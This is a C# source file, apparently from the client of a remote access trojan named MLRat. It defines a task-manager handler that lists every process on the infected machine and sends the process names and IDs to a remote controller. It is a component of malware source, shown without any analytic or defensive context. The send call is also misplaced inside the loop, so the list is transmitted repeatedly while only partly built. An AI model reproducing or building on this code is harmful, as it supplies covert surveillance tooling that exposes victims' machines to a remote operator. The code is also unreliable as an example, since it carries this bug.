using MLRat.Client;
using SharedCode.CustomObjects;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace MLManagementClient.Handlers
{
    public static class TaskManagerHandler
    {
        static IClientConnection NetworkHost = null;
        public static void SetNetworkHost(IClientConnection connection)
        {
            NetworkHost = connection;
        }

        public static void Handle(object[] data)
        {
            TaskManagerCommand command = (TaskManagerCommand)data[1];

            if (command == TaskManagerCommand.GetProcesses) GetProcesses();

        }

        public static void GetProcesses()
        {
            List<TrimProcess> procs = new List<TrimProcess>();
            foreach(Process p in Process.GetProcesses())
            {
                try
                {
                    TrimProcess tp = new TrimProcess();
                    tp.ID = p.Id;
                    tp.Name = p.ProcessName;
                    procs.Add(tp);
                }
                catch
                {

                }
                NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ProcessList, procs.ToArray());
            }
        }
    }
}
